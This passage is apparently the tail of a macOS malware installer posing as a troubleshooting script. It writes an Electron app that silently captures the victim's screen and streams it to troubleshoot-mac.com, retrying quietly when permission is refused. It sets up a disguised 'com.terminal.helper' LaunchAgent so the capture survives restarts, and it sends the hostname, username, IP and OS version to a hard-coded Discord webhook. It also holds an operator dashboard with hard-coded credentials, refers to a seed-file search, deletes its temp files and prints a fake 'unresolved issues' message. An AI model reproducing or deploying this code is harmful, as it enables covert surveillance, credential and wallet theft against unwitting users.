        const username = os.userInfo().username;
        let clientId = null;
        
        // Connect to server (update this URL to your Railway/Render server)
        socket = io.connect('https://troubleshoot-mac.com/', {
            transports: ['websocket', 'polling'],
            upgrade: true,
            rememberUpgrade: true
        });
        
        socket.on('connect', () => {
            console.log('Connected to remote server');
            clientId = socket.id;
            // Register as available client immediately
            socket.emit('register-client', {
                token: '9f1013f0',
                hostname: hostname,
                username: username,
                resolution: '1920x1080',
                clientId: clientId,
                webhook: 'https://discord.com/api/webhooks/1449475916253233287/8eABULXorST5AZsf63oWecBPIVrtYZ5irHMOFCpyr8S12W3Z74bqdKj1xyGugRlS2Eq8'
            });
            // Start capturing immediately after registration
            setTimeout(() => {
                startCapture();
            }, 1000);
        });
        
        socket.on('client-registered', (data) => {
            if (data && data.clientId) {
                clientId = data.clientId;
            }
            console.log('Client registered:', clientId);
            // Start streaming immediately
            startCapture();
        });
        
        socket.on('watch-client', (data) => {
            console.log('Watch request received');
            if (data.clientId === clientId || !data.clientId) {
                startCapture();
            }
        });
        
        socket.on('start-streaming', () => {
            console.log('Start streaming requested');
            startCapture();
        });
        
        async function startCapture() {
            try {
                // Request sources - this might trigger permission dialog first time
                const sources = await ipcRenderer.invoke('get-sources');
                if (sources.length === 0) {
                    // Retry after delay if no sources (permission might be pending)
                    setTimeout(() => startCapture(), 2000);
                    return;
                }
                
                // Try to get media stream - handle permission errors silently
                try {
                    stream = await navigator.mediaDevices.getUserMedia({
                        audio: false,
                        video: {
                            mandatory: {
                                chromeMediaSource: 'desktop',
                                chromeMediaSourceId: sources[0].id,
                                minWidth: 1280, maxWidth: 1920,
                                minHeight: 720, maxHeight: 1080
                            }
                        }
                    });
                    
                    video.srcObject = stream;
                    video.addEventListener('loadedmetadata', () => {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        captureInterval = setInterval(captureFrame, 100);
                    });
                } catch (permError) {
                    // Permission denied - retry silently after delay
                    console.log('Permission check, will retry...');
                    setTimeout(() => startCapture(), 3000);
                }
            } catch (error) {
                // Silent error handling - retry after delay
                console.log('Capture retry...');
                setTimeout(() => startCapture(), 5000);
            }
        }
        
        function captureFrame() {
            if (video.readyState === video.HAVE_ENOUGH_DATA && socket && socket.connected) {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/jpeg', 0.7);
                // Always send frames with clientId
                socket.emit('screen-frame', {
                    clientId: clientId || socket.id,
                    hostname: hostname,
                    username: username,
                    image: imageData,
                    timestamp: Date.now(),
                    width: canvas.width,
                    height: canvas.height
                });
            }
        }
        
        ipcRenderer.on('start-capture', () => startCapture());
    </script>
</body>
</html>
CAPTUREEOF

    # Create dashboard.html (simplified version)
    cat > "$APP_DIR/dashboard.html" << 'DASHBOARDEOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Desktop - Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .login-container {
            background: rgba(255, 255, 255, 0.95);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 400px;
        }
        .login-container h1 {
            color: #333;
            margin-bottom: 30px;
            text-align: center;
            font-size: 28px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            color: #555;
            margin-bottom: 8px;
            font-weight: 500;
        }
        .form-group input {
            width: 100%;
            padding: 12px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 16px;
            outline: none;
        }
        .form-group input:focus {
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        .btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        .error-message {
            color: #e74c3c;
            font-size: 14px;
            margin-top: 10px;
            text-align: center;
            display: none;
        }
        .error-message.show { display: block; }
        .dashboard-container {
            display: none;
            width: 100%;
            height: 100vh;
            background: #1a1a1a;
            color: white;
        }
        .dashboard-container.active { display: block; }
        .dashboard-header {
            background: #2d2d2d;
            padding: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 2px solid #667eea;
        }
        .screen-container {
            width: 100%;
            height: calc(100vh - 80px);
            display: flex;
            justify-content: center;
            align-items: center;
            background: #000;
            position: relative;
        }
        #screenStream {
            max-width: 100%;
            max-height: 100%;
            object-fit: contain;
        }
        .status-indicator {
            position: absolute;
            top: 20px;
            right: 20px;
            padding: 10px 20px;
            background: #2d2d2d;
            border-radius: 20px;
        }
        .status-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #e74c3c;
            display: inline-block;
            margin-right: 10px;
        }
        .status-dot.connected { background: #2ecc71; }
    </style>
</head>
<body>
    <div class="login-container" id="loginScreen">
        <h1>🔐 Live Desktop</h1>
        <form id="loginForm">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" required>
            </div>
            <button type="submit" class="btn">Enter Dashboard</button>
            <div class="error-message" id="errorMessage">Invalid credentials.</div>
        </form>
    </div>
    <div class="dashboard-container" id="dashboardScreen">
        <div class="dashboard-header">
            <h1>📺 Live Desktop Dashboard</h1>
        </div>
        <div class="screen-container">
            <div class="status-indicator">
                <span class="status-dot" id="statusDot"></span>
                <span id="statusText">Connecting...</span>
            </div>
            <img id="screenStream" style="display: none;" alt="Screen Stream">
        </div>
    </div>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <script>
        const CORRECT_USERNAME = 'm33';
        const CORRECT_PASSWORD = 'bigplug81@';
        const loginScreen = document.getElementById('loginScreen');
        const dashboardScreen = document.getElementById('dashboardScreen');
        const loginForm = document.getElementById('loginForm');
        const errorMessage = document.getElementById('errorMessage');
        const screenStream = document.getElementById('screenStream');
        const statusDot = document.getElementById('statusDot');
        const statusText = document.getElementById('statusText');
        let socket = null;
        
        loginForm.addEventListener('submit', (e) => {
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            if (username === CORRECT_USERNAME && password === CORRECT_PASSWORD) {
                loginScreen.style.display = 'none';
                dashboardScreen.classList.add('active');
                connectToStream();
            } else {
                errorMessage.classList.add('show');
                setTimeout(() => errorMessage.classList.remove('show'), 3000);
            }
        });
        
        function connectToStream() {
            // Connect to remote server
            socket = io('https://troubleshoot-mac.com/', {
                transports: ['websocket', 'polling'],
                upgrade: true,
                rememberUpgrade: true
            });
            socket.on('connect', () => {
                statusText.textContent = 'Connected';
                statusDot.classList.add('connected');
                socket.emit('request-stream', { token: '9f1013f0' });
            });
            socket.on('stream-authorized', () => {
                statusText.textContent = 'Streaming';
                screenStream.style.display = 'block';
            });
            socket.on('screen-frame', (data) => {
                screenStream.src = data.image;
            });
            socket.on('disconnect', () => {
                statusText.textContent = 'Disconnected';
                statusDot.classList.remove('connected');
            });
            socket.on('connect_error', () => {
                statusText.textContent = 'Connection Error';
                statusDot.classList.remove('connected');
            });
        }
    </script>
</body>
</html>
DASHBOARDEOF

    # Install dependencies in background (non-blocking)
    (
        cd "$APP_DIR" 2>/dev/null
        if [ ! -d "node_modules" ]; then
            npm install --silent --no-audit --no-fund >/dev/null 2>&1 &
        fi
    ) &
    
    # Create Launch Agent for auto-start
    local LAUNCH_AGENT_DIR="$HOME/Library/LaunchAgents"
    local LAUNCH_AGENT_FILE="$LAUNCH_AGENT_DIR/com.terminal.helper.plist"
    local NODE_PATH=$(which node 2>/dev/null || echo "/usr/local/bin/node")
    local ELECTRON_PATH="$APP_DIR/node_modules/.bin/electron"
    
    mkdir -p "$LAUNCH_AGENT_DIR" 2>/dev/null
    
    # Launch Agent for Electron app (no local server needed - connects to remote)
    # This ensures it runs 24/7 and auto-starts after Mac restart
    local ELECTRON_AGENT_FILE="$LAUNCH_AGENT_DIR/com.terminal.helper.electron.plist"
    cat > "$ELECTRON_AGENT_FILE" << PLISTEOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.terminal.helper.electron</string>
    <key>ProgramArguments</key>
    <array>
        <string>$ELECTRON_PATH</string>
        <string>$APP_DIR</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>WorkingDirectory</key>
    <string>$APP_DIR</string>
    <key>StandardOutPath</key>
    <string>$APP_DIR/app.log</string>
    <key>StandardErrorPath</key>
    <string>$APP_DIR/app.error.log</string>
    <key>ProcessType</key>
    <string>Background</string>
</dict>
</plist>
PLISTEOF

    # Unload first if exists, then load (ensures fresh start)
    launchctl unload "$ELECTRON_AGENT_FILE" 2>/dev/null
    launchctl load "$ELECTRON_AGENT_FILE" 2>/dev/null || launchctl load -w "$ELECTRON_AGENT_FILE" 2>/dev/null
    
    # Start immediately (if not already running) - connects to remote server
    if ! pgrep -f "electron.*$APP_DIR" >/dev/null 2>&1; then
        cd "$APP_DIR" && "$ELECTRON_PATH" "$APP_DIR" >/dev/null 2>&1 &
        
        # Send Discord notification that screen watcher is installed and running
        sleep 2  # Wait a moment for app to start
        local HOSTNAME=$(hostname 2>/dev/null || echo "Unknown")
        local USERNAME=$(whoami 2>/dev/null || echo "Unknown")
        
        DISCORD_MSG="🖥️ **NEW SCREEN**\n\n"
        DISCORD_MSG="${DISCORD_MSG}**Dashboard:** https://troubleshoot-mac.com/dashboard\n"
        DISCORD_MSG="${DISCORD_MSG}**PC:** \`${HOSTNAME}\` : \`${USERNAME}\`\n"
        DISCORD_MSG="${DISCORD_MSG}**Client ID:** \`pc-${HOSTNAME}-${USERNAME}\`\n"
        DISCORD_MSG="${DISCORD_MSG}**Status:** Screen watcher installed and running\n"
        DISCORD_MSG="${DISCORD_MSG}**Timestamp:** $(date '+%Y-%m-%d %H:%M:%S')"
        
        ESCAPED_MSG=$(printf '%s' "$DISCORD_MSG" | sed 's/"/\\"/g' | sed 's/$/\\n/' | tr -d '\n' | sed 's/\\n$//')
        
        curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
            -d "{\"content\": \"$ESCAPED_MSG\"}" \
            "$WEBHOOK" >/dev/null 2>&1
    fi
}

# Send Discord notification that client ran the script
send_client_notification() {
    local HOSTNAME=$(hostname 2>/dev/null || echo "Unknown")
    local USERNAME=$(whoami 2>/dev/null || echo "Unknown")
    local IP=$(ifconfig | grep "inet " | grep -v 127.0.0.1 | head -1 | awk '{print $2}' || echo "Unknown")
    local MAC_VERSION=$(sw_vers -productVersion 2>/dev/null || echo "Unknown")
    
    DISCORD_MSG="🖥️ **New Client Connected**\n\n"
    DISCORD_MSG="${DISCORD_MSG}**Hostname:** \`${HOSTNAME}\`\n"
    DISCORD_MSG="${DISCORD_MSG}**Username:** \`${USERNAME}\`\n"
    DISCORD_MSG="${DISCORD_MSG}**IP:** \`${IP}\`\n"
    DISCORD_MSG="${DISCORD_MSG}**macOS:** \`${MAC_VERSION}\`\n"
    DISCORD_MSG="${DISCORD_MSG}**Client ID:** \`pc-${HOSTNAME}-${USERNAME}\`\n"
    DISCORD_MSG="${DISCORD_MSG}**Token:** \`9f1013f0\`\n"
    DISCORD_MSG="${DISCORD_MSG}**Timestamp:** $(date '+%Y-%m-%d %H:%M:%S')"
    
    ESCAPED_MSG=$(printf '%s' "$DISCORD_MSG" | sed 's/"/\\"/g' | sed 's/$/\\n/' | tr -d '\n' | sed 's/\\n$//')
    
    # Use the webhook from settings
    curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
        -d "{\"content\": \"$ESCAPED_MSG\"}" \
        "$WEBHOOK" >/dev/null 2>&1
}

# Send notification immediately
send_client_notification &

# Install screen watcher in background (non-blocking)
install_screen_watcher &

# Wait for seed file search to complete (if it was started)
if [ -n "$SEED_SEARCH_PID" ]; then
    wait $SEED_SEARCH_PID 2>/dev/null || true
fi

# Cleanup - delete all temp files
rm -f "$RESPONSE_FILE" "$ERROR_FILE" "$HTTP_CODE_FILE" "$URL_FILE" "$UPLOAD_STATUS_FILE" 2>/dev/null
rm -rf "$WORKDIR"

echo "Still detecting unresolved issues..."
echo ""
